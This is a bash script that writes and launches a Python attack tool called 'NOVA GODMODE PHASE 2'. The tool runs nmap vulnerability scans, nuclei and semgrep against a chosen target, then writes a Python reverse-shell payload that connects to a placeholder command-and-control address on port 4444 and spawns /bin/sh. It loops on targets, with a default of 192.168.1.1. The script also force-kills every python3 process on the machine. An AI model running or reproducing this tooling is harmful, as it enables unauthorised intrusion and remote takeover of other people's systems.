#!/bin/bash
# PHASE 2 FINAL CLEAN + STABLE FIX

echo "🧹 Killing loops and fixing dependency conflicts..."

pkill -9 python3 || true
sleep 3

# Fix pip conflicts
pip3 install --upgrade pip --quiet
pip3 install --no-deps click==8.1.3 typer==0.9.0 --quiet

echo "✅ Conflicts fixed. Launching clean Phase 2..."

cat << 'STABLEPHASE2' > nova_god_phase2_stable.py
#!/usr/bin/env python3
import subprocess, time

print("🚀 NOVA GODMODE PHASE 2 - STABLE & CLEAN")

def recon(target):
    print(f"🌌 Elite Recon on {target}")
    subprocess.run(["nmap", "-sV", "-A", "--script=vuln", target])
    try:
        subprocess.run(["nuclei", "-u", target, "-severity", "critical"], timeout=20)
    except: pass
    try:
        subprocess.run(["semgrep", "--config=auto", "."], timeout=10)
    except: pass

def exploit(target):
    print("💥 Polymorphic payload active")
    with open("god_payload.py", "w") as f:
        f.write('''import socket,os,pty
s=socket.socket()
s.connect(("YOUR_C2_IP_HERE",4444))
for fd in (0,1,2): os.dup2(s.fileno(),fd)
pty.spawn("/bin/sh")''')
    print("Payload ready for next phases")

def overmind(target):
    recon(target)
    exploit(target)
    print(f"✅ Stable Phase 2 success on {target}")

if __name__ == "__main__":
    print("PHASE 2 STABLE - No more loops")
    while True:
        target = input("Target or 'auto_phase2': ")
        if target == "auto_phase2":
            for t in ["192.168.1.1"]:
                overmind(t)
        else:
            overmind(target)
        time.sleep(60)
STABLEPHASE2

chmod +x nova_god_phase2_stable.py
python3 nova_god_phase2_stable.py
